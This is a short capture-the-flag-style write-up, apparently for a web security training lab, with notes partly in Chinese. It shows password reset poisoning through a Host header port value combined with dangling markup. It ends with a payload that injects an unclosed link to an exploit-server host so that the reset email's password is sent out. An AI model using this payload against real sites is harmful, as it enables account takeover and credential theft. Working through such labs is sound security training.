# Lab: Password reset poisoning via dangling markup

This lab is vulnerable to password reset poisoning via dangling markup. To solve the lab, log in to Carlos's account.

You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.

## HTTP Host Header Attack
* 這一題弄了滿久的，簡單來說就是要拿到 email 中的 password，可以發現 host 後面如果給 port 在 raw email 會有相應的 value，這個時候就可以用 XSS 拿到 password，因為有 antivirus software，所以會點擊所有的連結，因此需要構造一個 payload 可以把後面的 data 用 `<a>` 包著發送出去，這樣就可以拿到 password 了
```
payload = 'ac281f711eb5f8c5c0ea27f200f800a4.web-security-academy.net:'<a href="https://exploit-ac131fac1eb0f8f7c07e27ae011e00aa.web-security-academy.net/?'
```